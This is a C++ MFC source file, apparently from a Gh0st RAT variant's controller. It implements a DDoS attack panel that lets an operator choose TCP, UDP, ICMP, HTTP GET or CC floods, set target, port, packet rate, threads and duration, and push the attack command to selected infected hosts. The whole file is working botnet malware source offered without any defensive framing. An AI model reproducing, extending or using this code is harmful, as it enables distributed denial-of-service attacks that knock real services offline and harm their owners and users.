// DDOS.cpp : implementation file
//

#include "stdafx.h"
#include "MainFrm.h"
#include "gh0stView.h"
#include "gh0st.h"
#include "DDOS.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CGh0stView* g_pConnectView;
extern CMainFrame* g_pFrame;
/////////////////////////////////////////////////////////////////////////////
// CDDOS

IMPLEMENT_DYNCREATE(CDDOS, CFormView)

CDDOS::CDDOS()
	: CFormView(CDDOS::IDD)
{
	//{{AFX_DATA_INIT(CDDOS)
	m_url = _T("");
	m_cookie = _T("");
	m_attacktime = 0;
	m_cc1 = 0;
	m_cc2 = 0;
	m_fabao = 0;
	m_port = 0;
	m_sleep = 0;
	m_thread = 0;
	m_getpage = _T("");
	//}}AFX_DATA_INIT
}

CDDOS::~CDDOS()
{
}

void CDDOS::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOS)
	DDX_Text(pDX, IDC_URL, m_url);
	DDX_Text(pDX, IDC_COOKIE, m_cookie);
	DDX_Text(pDX, IDC_ATTACKTIME, m_attacktime);
	DDX_Text(pDX, IDC_BIANCAN1, m_cc1);
	DDX_Text(pDX, IDC_BIANCAN2, m_cc2);
	DDX_Text(pDX, IDC_FaBao, m_fabao);
	DDX_Text(pDX, IDC_PORT, m_port);
	DDX_Text(pDX, IDC_SLEEP, m_sleep);
	DDX_Text(pDX, IDC_Thread, m_thread);
	DDX_Text(pDX, IDC_GETPAGE, m_getpage);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CDDOS, CFormView)
	//{{AFX_MSG_MAP(CDDOS)
	ON_BN_CLICKED(IDC_DdosBegin, OnDdosBegin)
	ON_BN_CLICKED(IDC_DDOS_STOP, OnDdosStop)
	ON_BN_CLICKED(IDC_RADIO1, OnTcpflood)
	ON_BN_CLICKED(IDC_RADIO2, OnUdpflood)
	ON_BN_CLICKED(IDC_RADIO4, OnCc)
	ON_BN_CLICKED(IDC_RADIO3, OnHttpget)
	ON_WM_CREATE()
	ON_BN_CLICKED(IDC_RADIO5, OnICMP)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDDOS diagnostics

#ifdef _DEBUG
void CDDOS::AssertValid() const
{
	CFormView::AssertValid();
}

void CDDOS::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

BOOL CDDOS::MyInitialization( DDOS_DATA *data )
{
	UpdateData(TRUE);
	memset( data, 0, sizeof(DDOS_DATA) );
	if ( DDOS_Flag == 0x0 )
	{
		AfxMessageBox(_T("请选择攻击方式!"));
		return FALSE;
	}
	data->Flag = COMMAND_DDOS;
	data->AttackFlag = DDOS_Flag;
	if ( lstrlen(m_url.GetBuffer(0)) > sizeof(data->Domain) )
	{
		AfxMessageBox(_T("输入的域名/IP太长!"));
		return FALSE;
	}
	memcpy( data->Domain, m_url.GetBuffer(0), sizeof(data->Domain) );
	if ( lstrlen(m_getpage.GetBuffer(0)) > sizeof(data->GetPage) )
	{
		AfxMessageBox(_T("输入的请求页面太长!"));
		return FALSE;
	}
	memcpy( data->GetPage, m_getpage.GetBuffer(0), sizeof(data->GetPage) );
	if ( m_port <= 0 || m_port >= 65535 )
	{
		AfxMessageBox(_T("输入的端口不正确!"));
		return FALSE;
	}
	data->Port = m_port;
	if ( m_fabao <= 0 || m_fabao > 1000 )
	{
		AfxMessageBox(_T("输入的单次发包数不正确!"));
		return FALSE;
	}
	data->Packs = m_fabao;
	if ( m_sleep < 5 || m_sleep > 1000 )
	{
		AfxMessageBox(_T("输入的发包间隔不正确!"));
		return FALSE;
	}
	data->SleepTime = m_sleep;
	if ( m_attacktime < 0 || m_attacktime >= sizeof(DWORD) )
	{
		AfxMessageBox(_T("输入的发包时间不正确!"));
		return FALSE;
	}
	data->AttackTime = m_attacktime;
	if ( m_cc1 < 0 || m_cc1 > 65535 )
	{
		AfxMessageBox(_T("输入的变参1不正确!"));
		return FALSE;
	}
	data->CCAttack_First = m_cc1;
	if ( m_cc2 < 0 || m_cc2 > 65535 || m_cc2 <= m_cc1 )
	{
		AfxMessageBox(_T("输入的变参2不正确!"));
		return FALSE;
	}
	data->CCAttack_END = m_cc2;
	if ( m_thread < 0 || m_thread > 500 )
	{
		AfxMessageBox(_T("输入的线程数不正确!"));
		return FALSE;
	}
	data->Thread = m_thread;
	
	return TRUE;
}

void CDDOS::SendSelectCommand(PBYTE pData, UINT nSize)
{
	// TODO: Add your command handler code here
	
	if ( g_pConnectView == NULL ) 
	{
		AfxMessageBox(_T("尚未初始化,请等待主机上线."));
		return;
	}

	POSITION pos = g_pConnectView->m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = g_pConnectView->m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)g_pConnectView->m_pListCtrl->GetItemData(nItem);
		// 发送获得驱动器列表数据包
		g_pConnectView->m_iocpServer->Send(pContext, pData, nSize);
		
		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}

/////////////////////////////////////////////////////////////////////////////
// CDDOS message handlers

void CDDOS::OnTcpflood()
{
	// TODO: Add your control notification handler code here
	DDOS_Flag = DDOS_TCP;
}

void CDDOS::OnDdosBegin() 
{
	// TODO: Add your control notification handler code here
	DDOS_DATA *pDDOS = new DDOS_DATA;
	if ( MyInitialization(pDDOS) )
	{
		SendSelectCommand( (BYTE*)pDDOS, sizeof(DDOS_DATA));
	}

	delete pDDOS;
}

void CDDOS::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
	// TODO: Add your specialized code here and/or call the base class
	if ( DDOS_Flag == 0x0 )
	{
		DDOS_Flag = 0x0;
		SetDlgItemText( IDC_URL, _T("127.0.0.1" ));
		SetDlgItemText( IDC_PORT, _T("80") );
		SetDlgItemText( IDC_FaBao, _T("30") );
		SetDlgItemText( IDC_SLEEP, _T("100") );
		SetDlgItemText( IDC_ATTACKTIME, _T("0") );
		SetDlgItemText( IDC_Thread, _T("5") );
		SetDlgItemText( IDC_BIANCAN1, _T("0") );
		SetDlgItemText( IDC_BIANCAN2, _T("1") );
		SetDlgItemText( IDC_GETPAGE, _T("/") );
	}
	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}

void CDDOS::OnDdosStop() 
{
	// TODO: Add your control notification handler code here
	BYTE msgg = COMMAND_DDOS_STOP;
	SendSelectCommand( &msgg, sizeof(BYTE));
}

void CDDOS::OnHttpget() 
{
	// TODO: Add your control notification handler code here
	DDOS_Flag = DDOS_HTTP_GET;
}

void CDDOS::OnUdpflood() 
{
	// TODO: Add your control notification handler code here
	DDOS_Flag = DDOS_UDP;
}

void CDDOS::OnCc() 
{
	// TODO: Add your control notification handler code here
	DDOS_Flag = DDOS_CC;
}



void CDDOS::OnICMP() 
{
	// TODO: Add your control notification handler code here
	DDOS_Flag = DDOS_ICMP;
}
